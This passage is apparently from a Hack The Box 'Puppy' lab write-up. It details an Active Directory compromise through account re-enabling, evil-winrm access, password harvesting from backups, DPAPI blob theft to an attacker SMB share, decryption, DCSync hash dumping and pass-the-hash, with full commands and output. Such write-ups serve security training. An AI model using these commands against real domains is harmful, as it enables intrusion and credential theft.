+<div class="reader-code"><div class="reader-code-toolbar"><span>bash</span><button type="button" aria-label="Copy code"><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-copy"><rect width="14" height="14" x="8" y="8" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg> Copy</button><span role="status" class="sr-only"></span></div><pre tabindex="0" aria-label="bash block, horizontally scrollable"><code class="hljs language-bash">ldapmodify -x -H ldap://10.10.11.70 -D <span class="hljs-string">&quot;ANT.EDWARDS@PUPPY.HTB&quot;</span> -w <span class="hljs-string">&#x27;Antman2025!&#x27;</span> -f enable_adam.ldif
+</code></pre></div>
+<div class="reader-code"><div class="reader-code-toolbar"><span>bash</span><button type="button" aria-label="Copy code"><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-copy"><rect width="14" height="14" x="8" y="8" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg> Copy</button><span role="status" class="sr-only"></span></div><pre tabindex="0" aria-label="bash block, horizontally scrollable"><code class="hljs language-bash">modifying entry <span class="hljs-string">&quot;CN=Adam D. Silver,CN=Users,DC=PUPPY,DC=HTB&quot;</span>
+</code></pre></div>
+<ul>
+<li>ADAM.SILVER account successfully enabled (userAccountControl now 512).</li>
+</ul>
+<hr/>
+<h3 id="section-initial-foothold-via-evil-winrm"><a href="#section-initial-foothold-via-evil-winrm" class="heading-link">Initial Foothold via Evil-WinRM</a></h3>
+<div class="reader-code"><div class="reader-code-toolbar"><span>bash</span><button type="button" aria-label="Copy code"><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-copy"><rect width="14" height="14" x="8" y="8" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg> Copy</button><span role="status" class="sr-only"></span></div><pre tabindex="0" aria-label="bash block, horizontally scrollable"><code class="hljs language-bash">evil-winrm -i 10.10.11.70 -u <span class="hljs-string">&#x27;ADAM.SILVER&#x27;</span> -p <span class="hljs-string">&#x27;Pwned123!&#x27;</span>
+</code></pre></div>
+<div class="reader-code"><div class="reader-code-toolbar"><span>powershell</span><button type="button" aria-label="Copy code"><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-copy"><rect width="14" height="14" x="8" y="8" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg> Copy</button><span role="status" class="sr-only"></span></div><pre tabindex="0" aria-label="powershell block, horizontally scrollable"><code class="hljs language-powershell">*Evil-WinRM* PS C:\Users\adam.silver\Desktop&gt; ls
+Mode LastWriteTime Length Name
+-a---- 9/15/2025 4:02 AM 34 user.txt
+&lt;SNIP&gt;
+</code></pre></div>
+<div class="reader-code"><div class="reader-code-toolbar"><span>powershell</span><button type="button" aria-label="Copy code"><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-copy"><rect width="14" height="14" x="8" y="8" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg> Copy</button><span role="status" class="sr-only"></span></div><pre tabindex="0" aria-label="powershell block, horizontally scrollable"><code class="hljs language-powershell">*Evil-WinRM* PS C:\Users\adam.silver\Desktop&gt; cat user.txt
+3fcd9cef&lt;REDACTED&gt;
+</code></pre></div>
+<ul>
+<li>
+<p>Initial user shell obtained for ADAM.SILVER.</p>
+</li>
+<li>
+<p>user.txt captured on Desktop confirms foothold.</p>
+</li>
+</ul>
+<hr/>
+<h2 id="section-privileges-esaclation"><a href="#section-privileges-esaclation" class="heading-link">Privileges Esaclation</a></h2>
+<h3 id="section-local-windows-machine-pillaging"><a href="#section-local-windows-machine-pillaging" class="heading-link">Local Windows Machine Pillaging</a></h3>
+<div class="reader-code"><div class="reader-code-toolbar"><span>powershell</span><button type="button" aria-label="Copy code"><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-copy"><rect width="14" height="14" x="8" y="8" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg> Copy</button><span role="status" class="sr-only"></span></div><pre tabindex="0" aria-label="powershell block, horizontally scrollable"><code class="hljs language-powershell">*Evil-WinRM* PS C:\Users\adam.silver\Documents&gt; whoami /all
+</code></pre></div>
+<div class="reader-code"><div class="reader-code-toolbar"><span>text</span><button type="button" aria-label="Copy code"><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-copy"><rect width="14" height="14" x="8" y="8" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg> Copy</button><span role="status" class="sr-only"></span></div><pre tabindex="0" aria-label="text block, horizontally scrollable"><code class="hljs language-text">USER INFORMATION
+User Name SID
+puppy\adam.silver S-1-5-21-1487982659-1829050783-2281216199-1105
+
+GROUP INFORMATION
+Group Name ... 
+PUPPY\DEVELOPERS ... S-1-5-21-1487982659-1829050783-2281216199-1113
+... BUILTIN\Remote Management Users, BUILTIN\Users, NT AUTHORITY\NETWORK, etc.
+
+PRIVILEGES INFORMATION
+SeMachineAccountPrivilege Add workstations to domain Enabled
+SeChangeNotifyPrivilege Bypass traverse checking Enabled
+SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
+</code></pre></div>
+<ul>
+<li>
+<p>User is member of DEVELOPERS and standard builtin groups.</p>
+</li>
+<li>
+<p>SeMachineAccountPrivilege present and enabled (can create machine accounts).</p>
+</li>
+<li>
+<p>Useful local privileges enumerated for lateral/privilege escalation.</p>
+</li>
+</ul>
+<hr/>
+<div class="reader-code"><div class="reader-code-toolbar"><span>powershell</span><button type="button" aria-label="Copy code"><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-copy"><rect width="14" height="14" x="8" y="8" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg> Copy</button><span role="status" class="sr-only"></span></div><pre tabindex="0" aria-label="powershell block, horizontally scrollable"><code class="hljs language-powershell">*Evil-WinRM* PS C:\Users\adam.silver\Documents&gt; net localgroup administrators
+</code></pre></div>
+<div class="reader-code"><div class="reader-code-toolbar"><span>text</span><button type="button" aria-label="Copy code"><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-copy"><rect width="14" height="14" x="8" y="8" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg> Copy</button><span role="status" class="sr-only"></span></div><pre tabindex="0" aria-label="text block, horizontally scrollable"><code class="hljs language-text">Alias name administrators
+Members
+Administrator
+Domain Admins
+Enterprise Admins
+steph.cooper_adm
+The command completed successfully.
+</code></pre></div>
+<ul>
+<li>steph.cooper_adm is a local administrator on this host.</li>
+</ul>
+<hr/>
+<div class="reader-code"><div class="reader-code-toolbar"><span>powershell</span><button type="button" aria-label="Copy code"><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-copy"><rect width="14" height="14" x="8" y="8" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg> Copy</button><span role="status" class="sr-only"></span></div><pre tabindex="0" aria-label="powershell block, horizontally scrollable"><code class="hljs language-powershell">*Evil-WinRM* PS C:\Users\adam.silver\Documents&gt; Get-ADUser adam.silver -Properties msDS-AllowedToDelegateTo, msDS-AllowedToActOnBehalfOfOtherIdentity
+</code></pre></div>
+<div class="reader-code"><div class="reader-code-toolbar"><span>text</span><button type="button" aria-label="Copy code"><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-copy"><rect width="14" height="14" x="8" y="8" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg> Copy</button><span role="status" class="sr-only"></span></div><pre tabindex="0" aria-label="text block, horizontally scrollable"><code class="hljs language-text">DistinguishedName : CN=Adam D. Silver,CN=Users,DC=PUPPY,DC=HTB
+Enabled : True
+GivenName : Adam
+Name : Adam D. Silver
+SamAccountName : adam.silver
+UserPrincipalName : adam.silver@PUPPY.HTB
+&lt;SNIP&gt;
+</code></pre></div>
+<ul>
+<li>AD user object confirmed. No delegation properties shown in output snippet.</li>
+</ul>
+<hr/>
+<h3 id="section-backup-recon-and-secret-harvesting"><a href="#section-backup-recon-and-secret-harvesting" class="heading-link">Backup Recon and Secret Harvesting</a></h3>
+<div class="reader-code"><div class="reader-code-toolbar"><span>powershell</span><button type="button" aria-label="Copy code"><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-copy"><rect width="14" height="14" x="8" y="8" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg> Copy</button><span role="status" class="sr-only"></span></div><pre tabindex="0" aria-label="powershell block, horizontally scrollable"><code class="hljs language-powershell">*Evil-WinRM* PS C:\Backups&gt; ls
+</code></pre></div>
+<div class="reader-code"><div class="reader-code-toolbar"><span>text</span><button type="button" aria-label="Copy code"><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-copy"><rect width="14" height="14" x="8" y="8" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg> Copy</button><span role="status" class="sr-only"></span></div><pre tabindex="0" aria-label="text block, horizontally scrollable"><code class="hljs language-text">Mode LastWriteTime Length Name
+-a---- 3/8/2025 8:22 AM 4639546 site-backup-2024-12-30.zip
+</code></pre></div>
+<ul>
+<li>
+<p>Backup archive found at C:\Backups\site-backup-2024-12-30.zip.</p>
+</li>
+<li>
+<p>On attacker machine after download &amp; unzip:</p>
+</li>
+</ul>
+<div class="reader-code"><div class="reader-code-toolbar"><span>bash</span><button type="button" aria-label="Copy code"><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-copy"><rect width="14" height="14" x="8" y="8" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg> Copy</button><span role="status" class="sr-only"></span></div><pre tabindex="0" aria-label="bash block, horizontally scrollable"><code class="hljs language-bash">grep -RiE <span class="hljs-string">&quot;pass|user&quot;</span> .
+./assets/sass/main.scss: input[<span class="hljs-built_in">type</span>=<span class="hljs-string">&quot;password&quot;</span>],
+./nms-auth-config.xml.bak: &lt;bind-password&gt;ChefSteph2025!&lt;/bind-password&gt;
+</code></pre></div>
+<ul>
+<li>grep located backup file containing nms-auth-config.xml.bak with an embedded bind-password.</li>
+<li>read ./nms-auth-config.xml.bak</li>
+</ul>
+<div class="reader-code"><div class="reader-code-toolbar"><span>xml</span><button type="button" aria-label="Copy code"><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-copy"><rect width="14" height="14" x="8" y="8" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg> Copy</button><span role="status" class="sr-only"></span></div><pre tabindex="0" aria-label="xml block, horizontally scrollable"><code class="hljs language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">SNIP</span>&gt;</span>
+<span class="hljs-tag">&lt;<span class="hljs-name">base-dn</span>&gt;</span>dc=PUPPY,dc=HTB<span class="hljs-tag">&lt;/<span class="hljs-name">base-dn</span>&gt;</span>
+<span class="hljs-tag">&lt;<span class="hljs-name">bind-dn</span>&gt;</span>cn=steph.cooper,dc=puppy,dc=htb<span class="hljs-tag">&lt;/<span class="hljs-name">bind-dn</span>&gt;</span>
+<span class="hljs-tag">&lt;<span class="hljs-name">bind-password</span>&gt;</span>ChefSteph2025!<span class="hljs-tag">&lt;/<span class="hljs-name">bind-password</span>&gt;</span>
+</code></pre></div>
+<ul>
+<li>Credentials recovered: steph.cooper : ChefSteph2025!</li>
+</ul>
+<hr/>
+<h2 id="section-login-as-stephcooper"><a href="#section-login-as-stephcooper" class="heading-link">Login as steph.cooper</a></h2>
+<div class="reader-code"><div class="reader-code-toolbar"><span>bash</span><button type="button" aria-label="Copy code"><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-copy"><rect width="14" height="14" x="8" y="8" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg> Copy</button><span role="status" class="sr-only"></span></div><pre tabindex="0" aria-label="bash block, horizontally scrollable"><code class="hljs language-bash">evil-winrm -i 10.10.11.70 -u <span class="hljs-string">&#x27;steph.cooper&#x27;</span> -p <span class="hljs-string">&#x27;ChefSteph2025!&#x27;</span>
+upload winPEASx64.exe
+</code></pre></div>
+<hr/>
+<h3 id="section-winpeas-findings"><a href="#section-winpeas-findings" class="heading-link">winPEAS Findings</a></h3>
+<ul>
+<li>
+<p>Writable Named Pipes with Everyone write/create permissions (eventlog, ROUTER, RpcProxy*, vgauth-service).</p>
+</li>
+<li>
+<p>LSA Protection and CredentialGuard disabled.</p>
+</li>
+<li>
+<p>SeMachineAccountPrivilege enabled for current token.</p>
+</li>
+<li>
+<p>cachedlogonscount = 10 (cached credentials exist).</p>
+</li>
+<li>
+<p>AutoLogon credentials present.</p>
+</li>
+<li>
+<p>LocalAccountTokenFilterPolicy indicates only RID-500 local admin usable for lateral movement.</p>
+</li>
+<li>
+<p>These findings indicate multiple credential extraction and abuse vectors.</p>
+</li>
+</ul>
+<hr/>
+<h2 id="section-dpapi-masterkey-extraction-and-decryption"><a href="#section-dpapi-masterkey-extraction-and-decryption" class="heading-link">DPAPI / Masterkey Extraction and Decryption</a></h2>
+<p>After local recon we discover:</p>
+<div class="reader-code"><div class="reader-code-toolbar"><span>powershell</span><button type="button" aria-label="Copy code"><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-copy"><rect width="14" height="14" x="8" y="8" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg> Copy</button><span role="status" class="sr-only"></span></div><pre tabindex="0" aria-label="powershell block, horizontally scrollable"><code class="hljs language-powershell">C:\Users\steph.cooper\AppData\Roaming\Microsoft\Credentials\C8D69EBE9A43E9DEBF6B5FBD48B521B9
+
+C:\Users\steph.cooper\AppData\Roaming\Microsoft\Protect\S-1-5-21-...-1107\556a2412-1275-4ccf-b721-e6a0b4f90407
+</code></pre></div>
+<ul>
+<li>User DPAPI masterkey and credential blob located in user profile.</li>
+</ul>
+<h4 id="section-start-attacker-smbserver"><a href="#section-start-attacker-smbserver" class="heading-link">Start attacker smbserver</a></h4>
+<div class="reader-code"><div class="reader-code-toolbar"><span>bash</span><button type="button" aria-label="Copy code"><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-copy"><rect width="14" height="14" x="8" y="8" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg> Copy</button><span role="status" class="sr-only"></span></div><pre tabindex="0" aria-label="bash block, horizontally scrollable"><code class="hljs language-bash">impacket-smbserver share ./share -smb2support
+</code></pre></div>
+<h4 id="section-copy-files-from-target"><a href="#section-copy-files-from-target" class="heading-link">Copy files from target:</a></h4>
+<div class="reader-code"><div class="reader-code-toolbar"><span>powershell</span><button type="button" aria-label="Copy code"><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-copy"><rect width="14" height="14" x="8" y="8" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg> Copy</button><span role="status" class="sr-only"></span></div><pre tabindex="0" aria-label="powershell block, horizontally scrollable"><code class="hljs language-powershell">copy &quot;&lt;masterkey path&gt;&quot; \\10.10.14.137\share\masterkey_blob
+copy &quot;&lt;credential path&gt;&quot; \\10.10.14.137\share\credential_blob
+</code></pre></div>
+<h3 id="section-decrypt-the-key"><a href="#section-decrypt-the-key" class="heading-link">Decrypt the key</a></h3>
+<div class="reader-code"><div class="reader-code-toolbar"><span>bash</span><button type="button" aria-label="Copy code"><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-copy"><rect width="14" height="14" x="8" y="8" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg> Copy</button><span role="status" class="sr-only"></span></div><pre tabindex="0" aria-label="bash block, horizontally scrollable"><code class="hljs language-bash">impacket-dpapi masterkey -file masterkey_blob -password <span class="hljs-string">&#x27;ChefSteph2025!&#x27;</span> -sid S-1-5-21-1487982659-1829050783-2281216199-1107
+</code></pre></div>
+<div class="reader-code"><div class="reader-code-toolbar"><span>text</span><button type="button" aria-label="Copy code"><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-copy"><rect width="14" height="14" x="8" y="8" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg> Copy</button><span role="status" class="sr-only"></span></div><pre tabindex="0" aria-label="text block, horizontally scrollable"><code class="hljs language-text">[MASTERKEYFILE]
+Version : 2 (2)
+Guid : 556a2412-1275-4ccf-b721-e6a0b4f90407
+...
+Decrypted key with User Key (MD4 protected)  
+Decrypted key: 0xd9a570722fbaf7149f9f9d691b0e137b7413c1414c452f9c77d6d8a8ed9efe3ecae990e047debe4ab8cc879e8ba99b31cdb7abad28408d8d9cbfdcaf319e9c84
+</code></pre></div>
+<ul>
+<li>Masterkey successfully decrypted using steph.cooper password.</li>
+</ul>
+<div class="reader-code"><div class="reader-code-toolbar"><span>bash</span><button type="button" aria-label="Copy code"><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-copy"><rect width="14" height="14" x="8" y="8" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg> Copy</button><span role="status" class="sr-only"></span></div><pre tabindex="0" aria-label="bash block, horizontally scrollable"><code class="hljs language-bash">impacket-dpapi credential -file credential_blob -key 0xd9a57...9e9c84
+</code></pre></div>
+<div class="reader-code"><div class="reader-code-toolbar"><span>text</span><button type="button" aria-label="Copy code"><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-copy"><rect width="14" height="14" x="8" y="8" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg> Copy</button><span role="status" class="sr-only"></span></div><pre tabindex="0" aria-label="text block, horizontally scrollable"><code class="hljs language-text">[CREDENTIAL]
+LastWritten : 2025-03-08 15:54:29+00:00
+Type : CRED_TYPE_DOMAIN_PASSWORD
+Target : Domain:target=PUPPY.HTB
+Username : steph.cooper_adm
+Unknown : FivethChipOnItsWay2025!
+</code></pre></div>
+<ul>
+<li>DPAPI credential decrypted. Recovered domain privileged credential:<br/>
+<strong>steph.cooper_adm : FivethChipOnItsWay2025!</strong></li>
+</ul>
+<hr/>
+<h2 id="section-domain-admin-takeover"><a href="#section-domain-admin-takeover" class="heading-link">Domain Admin Takeover</a></h2>
+<h3 id="section-bloodhound-enumeration"><a href="#section-bloodhound-enumeration" class="heading-link">BloodHound Enumeration</a></h3>
+<div class="reader-code"><div class="reader-code-toolbar"><span>bash</span><button type="button" aria-label="Copy code"><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-copy"><rect width="14" height="14" x="8" y="8" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg> Copy</button><span role="status" class="sr-only"></span></div><pre tabindex="0" aria-label="bash block, horizontally scrollable"><code class="hljs language-bash">bloodhound-python -u <span class="hljs-string">&#x27;steph.cooper_adm&#x27;</span> -p <span class="hljs-string">&#x27;FivethChipOnItsWay2025!&#x27;</span> -d puppy.htb -ns 10.10.11.70 -c All --zip
+</code></pre></div>
+<p><button type="button" class="reader-image" aria-label="Enlarge image: puppy_4"><img src="/assets/puppy/puppy_4.jpg" alt="puppy_4" width="1846" height="898" loading="lazy" decoding="async"/><span>Tap to enlarge</span></button></p>
+<p><button type="button" class="reader-image" aria-label="Enlarge image: puppy_5"><img src="/assets/puppy/puppy_5.jpg" alt="puppy_5" width="990" height="454" loading="lazy" decoding="async"/><span>Tap to enlarge</span></button></p>
+<ul>
+<li>
+<p>Analysis shows <code>steph.cooper_adm</code> has <strong>WriteDacl</strong>, <strong>WriteOwner</strong>, <strong>GenericWrite</strong> over <code>ADMINISTRATORS</code> group.</p>
+</li>
+<li>
+<p><code>ADMINISTRATORS</code> has <strong>AllExtendedRights</strong> over <code>Administrator</code>.</p>
+</li>
+<li>
+<p>Effective control chain enables <strong>DCSync</strong> attack.</p>
+</li>
+</ul>
+<hr/>
+<h3 id="section-dcsync-execution"><a href="#section-dcsync-execution" class="heading-link">DCSync Execution</a></h3>
+<div class="reader-code"><div class="reader-code-toolbar"><span>bash</span><button type="button" aria-label="Copy code"><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-copy"><rect width="14" height="14" x="8" y="8" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg> Copy</button><span role="status" class="sr-only"></span></div><pre tabindex="0" aria-label="bash block, horizontally scrollable"><code class="hljs language-bash">impacket-secretsdump <span class="hljs-string">&#x27;puppy.htb/steph.cooper_adm:FivethChipOnItsWay2025!&#x27;</span>@10.10.11.70
+</code></pre></div>
+<div class="reader-code"><div class="reader-code-toolbar"><span>text</span><button type="button" aria-label="Copy code"><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-copy"><rect width="14" height="14" x="8" y="8" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg> Copy</button><span role="status" class="sr-only"></span></div><pre tabindex="0" aria-label="text block, horizontally scrollable"><code class="hljs language-text">Administrator:500:...:9c541c389e2904b9b112f599fd6b333d:::
+&lt;SNIP&gt;
+[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
+Administrator:500:...:bb0edc15e49ceb4120c7bd7e6e65d75b:::
+krbtgt:502:...:a4f2989236a639ef3f766e5fe1aad94a:::
+PUPPY.HTB\steph.cooper_adm:1111:...:ccb206409049bc53502039b80f3f1173:::
+&lt;SNIP&gt;
+[*] Kerberos keys grabbed
+Administrator:aes256-cts-hmac-sha1-96:c0b23d37b5ad3de31aed317bf6c6fd1f338d9479def408543b85bac046c596c0
+&lt;SNIP&gt;
+</code></pre></div>
+<ul>
+<li>
+<p>Full NTDS dump obtained.</p>
+</li>
+<li>
+<p>Administrator NTLM hash: <strong>bb0edc15e49ceb4120c7bd7e6e65d75b</strong>.</p>
+</li>
+</ul>
+<hr/>
+<h3 id="section-final-access-as-domain-admin"><a href="#section-final-access-as-domain-admin" class="heading-link">Final Access as Domain Admin</a></h3>
+<h3 id="section-pass-the-hash"><a href="#section-pass-the-hash" class="heading-link">Pass-the-hash</a></h3>
+<div class="reader-code"><div class="reader-code-toolbar"><span>bash</span><button type="button" aria-label="Copy code"><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-copy"><rect width="14" height="14" x="8" y="8" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg> Copy</button><span role="status" class="sr-only"></span></div><pre tabindex="0" aria-label="bash block, horizontally scrollable"><code class="hljs language-bash">evil-winrm -i 10.10.11.70 -u <span class="hljs-string">&#x27;Administrator&#x27;</span> -H <span class="hljs-string">&#x27;bb0edc15e49ceb4120c7bd7e6e65d75b&#x27;</span>
+</code></pre></div>
+<div class="reader-code"><div class="reader-code-toolbar"><span>powershell</span><button type="button" aria-label="Copy code"><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-copy"><rect width="14" height="14" x="8" y="8" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg> Copy</button><span role="status" class="sr-only"></span></div><pre tabindex="0" aria-label="powershell block, horizontally scrollable"><code class="hljs language-powershell">*Evil-WinRM* PS C:\Users\Administrator\Desktop&gt; ls
+
+    Directory: C:\Users\Administrator\Desktop
+
+Mode LastWriteTime Length Name
+---- ------------- ------ ----
+-ar--- 9/16/2025 5:51 AM 34 root.txt
+</code></pre></div>
+<div class="reader-code"><div class="reader-code-toolbar"><span>powershell</span><button type="button" aria-label="Copy code"><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-copy"><rect width="14" height="14" x="8" y="8" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg> Copy</button><span role="status" class="sr-only"></span></div><pre tabindex="0" aria-label="powershell block, horizontally scrollable"><code class="hljs language-powershell">*Evil-WinRM* PS C:\Users\Administrator\Desktop&gt; cat root.txt
+b88e5b3&lt;REDACTED&gt;
+</code></pre></div>
+<ul>
+<li>
+<p>Root flag captured.</p>
+</li>
+<li>
+<p>Domain compromise achieved via DCSync → Administrator hash → full system takeover.</p>
+</li>
+</ul>
+<hr/>
+<h2 id="section-conclusions"><a href="#section-conclusions" class="heading-link">Conclusions</a></h2>
+<ul>
+<li>
